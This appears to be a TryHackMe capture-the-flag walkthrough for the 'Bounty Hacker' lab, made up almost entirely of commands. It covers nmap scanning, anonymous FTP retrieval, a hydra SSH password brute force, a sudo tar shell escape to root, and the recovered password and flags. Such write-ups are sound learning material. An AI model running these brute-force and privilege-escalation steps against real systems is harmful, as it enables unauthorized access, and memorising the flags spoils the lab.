# THM - Bounty Hacker
- IP Target: `10.10.81.242`

## Scanning
```bash
→ ping -c 4 10.10.81.242

→ nmap -sC -sV -oN nmap.txt 10.10.81.242
```

## Enumeration
```bash
→ ftp 10.10.81.242
# Name: anonymous
# I found 2 intersting files: locks.txt and task.txt

→ get locks.txt
→ get task.txt
# Download these file into my local machine.
```

## Password Attack
```bash
hydra -l lin -P locks.txt ssh://10.10.81.242
# login: lin, password: RedDr4gonSynd1cat3
```

## Find user flag
```bash
ssh lin@10.10.81.242

cat user.txt
# Flag_1: THM{CR1M3_SyNd1C4T3}
```

## Privilage Escalation
```bash
sudo -l
# (root) /bin/tar

# Use this website: https://gtfobins.github.io => tar => sudo

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

python3 -c 'import pty;pty.spawn("/bin/bash")'

cat /root/root.txt
# Flag_2: THM{80UN7Y_h4cK3r}
```